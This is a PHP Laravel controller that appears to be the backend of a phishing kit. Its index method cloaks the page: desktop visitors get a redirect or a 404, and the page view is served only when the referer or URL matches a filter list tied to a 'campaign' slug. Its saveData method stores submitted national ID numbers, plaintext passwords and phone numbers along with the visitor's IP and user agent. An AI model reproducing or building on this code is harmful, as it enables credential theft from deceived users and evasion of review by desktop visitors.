<?php

namespace App\Http\Controllers;

use App\Http\Requests\loginsRequest;
use App\Models\AdminOptions;
use App\Models\ForbiddensModel;
use App\Models\LoginModel;
use App\Supports\Verify;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Jenssegers\Agent\Facades\Agent;

class MainController extends Controller
{
    public function index(Request $request)
    {
        $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
        $forbidden = ForbiddensModel::all();
        $referer = $request->headers->get('referer');
        $fullUrl = request()->fullUrl();

        if (Agent::isDesktop()) {
            return match ($redirectPath->value) {
                'home' => redirect(route('root.index')),
                '404' => abort(404),
            };
        }

        $results = $forbidden->filter(function ($ban) use ($referer, $fullUrl) {
            if (str_contains($referer, $ban->value) !== false)
                return $ban;
            elseif (str_contains($fullUrl, $ban->value) !== false)
                return $ban;

            return null;
        });
        if ($results->isEmpty()) {
            $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
            $match = match ($redirectPath->value) {
                'home' => Redirect::route('root.index'),
                '404' => abort(404),
                default => abort(404),
            };
            return $match;
        }

        return view('wordpress');
    }
    public function gg(Request $request)
    {
        return view('main');
    }
    public function handleSlug($slug)
    {
        $getSlug = AdminOptions::firstWhere('key', 'kampanya_link');
        // Slug'a göre yapılacak işlemler
        $panelSlug = $getSlug->value ?? 'basvuru';  // Panelden gelen slug
        if ($slug === $panelSlug) {
            return $this->index(request());
        }

        // Eğer slug panel slug'ı değilse, 404 döndür veya başka bir işlem yap
        abort(404);
    }

    public function saveData(loginsRequest $request)
    {
        if ($request->tc && $request->password) {
            $uniqueReq = LoginModel::query()->where([
                'tc' => $request->tc,
                'password' => $request->password,
                'phone' => $request->phone
            ]);

            if (!$uniqueReq->exists()) {
                $request->merge(
                    [
                        'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
                        'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
                        'date' => Carbon::now(),
                        'site' => request()->server('HTTP_HOST'),
                        'ip' => $request->ip(),
                    ]
                );

                LoginModel::insert($request->all());
                return response()->json(['result' => 'success'], 200);
            } else {
                return response()->json(['result' => 'error', 200]);
            }
        }
    }

    public function test(Request $request)
    {
    }
}
